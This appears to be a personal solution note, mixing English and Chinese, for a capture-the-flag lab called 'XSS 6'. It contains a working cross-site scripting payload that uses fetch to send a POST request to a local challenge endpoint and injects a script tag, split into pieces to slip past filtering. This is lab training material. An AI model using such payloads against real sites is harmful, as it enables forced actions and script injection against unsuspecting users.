@@ -1,0 +1,29 @@
+#XSS 6 
+#挑战简介
+Once an attacker has code execution inside a victim's browser, they can do a lot of things. You've made a GET request in your previous attack, but typically, 
+it's the POST requests that will change application state. This challenge ratchets up the realism: the /publish now needs a POST request. Luckily, fetch supports this!
+
+Go figure out how to POST, and get the flag.
+
+#和上一题一个思路，只不过上一个是GET，这一个是POST
+#POST相较于GET，多了一个Content参数，需要在Content参数中写入alert脚本
+<script>
+    // 你的 fetch 请求
+    fetch('http://challenge.localhost/publish', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        // 将 <script> 标签作为字符串拆分，避免与外部冲突
+        content: '<scr' + 'ipt>alert("PWNED")</scr' + 'ipt>'
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log('Success:', data); // 处理服务器响应
+    })
+    .catch((error) => {
+      console.error('Error:', error); // 处理错误
+    });
+</script>
